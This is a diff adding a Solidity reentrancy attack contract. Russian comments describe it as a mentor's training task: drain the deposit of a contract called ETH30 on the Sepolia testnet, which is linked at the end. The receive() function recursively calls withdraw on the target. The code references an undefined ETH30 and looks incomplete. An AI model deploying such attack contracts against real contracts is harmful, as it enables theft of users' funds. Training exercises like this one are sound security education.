@@ -1,0 +1,25 @@
+//solidity и мне дали тестовое задание на атаку повторного входа. Наставник создал контракт с названием (ETH30)и внес на него депозит. 
+//Задача: забрать весь внесенный депозит с его контракта методом reentrancy attack. 
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+contract Attack {
+    function deposit(address payable _to) external payable {
+        (bool success, ) = _to.call{value: msg.value}("");
+        require(success, "Failed to send Ether");
+    }
+
+    function attack(address payable _eth30) public payable {
+        if (_eth30.balance >= msg.value) {
+            ETH30(_eth30).withdraw();
+        }
+    }
+
+    // receive function is called whenever the attacker receives Ether
+    receive() external payable {
+        attack(payable(msg.sender));
+    }
+}
+
+https://sepolia.etherscan.io/address/0x5880d54770f0ed61835a4692757b5f5f3b427d96#code
